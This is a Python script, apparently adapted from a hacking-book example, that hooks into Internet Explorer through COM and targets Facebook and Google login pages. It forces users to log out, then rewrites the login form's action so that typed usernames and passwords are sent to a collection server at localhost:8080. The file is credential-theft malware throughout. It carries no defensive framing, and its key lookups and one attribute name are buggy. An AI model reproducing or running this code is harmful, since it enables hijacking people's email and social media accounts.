import time
import urllib.parse
import win32com.client

data_receiver = "http://localhost:8080/"

target_sites = {
    "www.facebook.com":
        {
            "logout_url": None,
            "logout_form": "logout_form",
            "login_form_index": 0,
            "owned": False
        },
    "accounts.google.com":
        {
            "logout_url": "https://accounts.google.com/Logout?hl=en&continue="
                          "https://accounts.google.com/"
                          "ServiceLogin%3Fservice%3Dmail",
            "logout_form": None,
            "login_form_index": 0,
            "owned": False
        }
}

def wait_for_browser(browser):

    #espera o navegador terminar de carregar uma pagina
    while browser.ReadyState != 4 and browser.ReadState != "complete":
        time.sleep(0.1)
    
    return


target_sites["www.gmail.com"] = target_sites["accounts.google.com"]
target_sites["mail.google.com"] = target_sites["accounts.google.com"]

clsid = '{9BA05972-F6A8-11CF-A442-00A0C90A8F39}'

windows = win32com.client.Dispatch(clsid)

while True:
    for browser in windows:
        url = urllib.parse.urlparse(browser.LocationUrl)
        if url.hostname in target_sites:
            if target_sites[url.hostname]["owned"]:
                continue
            #se houver um URL, podemos simplesmente fazer o redirecionamento
            if target_sites[url.hostname]["logout_url"]:
                browser.Navigate(target_sites[url.hostname]["logout_url"])
                wait_for_browser(browser)
            else:
                #obtém todos os elementos do documento
                full_doc = browser.Document.all

                # faz uma iteracao, procurando o formulario de logout
                for i in full_doc:

                    try:

                        #encontra o formulario de logout e submete-o
                        if i.id == target_sites[url.hostname]["login_form"]:
                            i.submit()
                            wait_for_browser(browser)
                    
                    except:
                        pass

                # agora modificaremos o formulário de login
            try:
                login_index = target_sites[url.hostname]["login_form_index"]
                login_page = urllib.parse.quote(browser.LocationUrl)
                browser.Document.forms[login_index].action = "%s%s" % (data_receiver, login_page)
                target_sites[url.hostname]["owned"] = True
            except:
                pass
        time.sleep(5)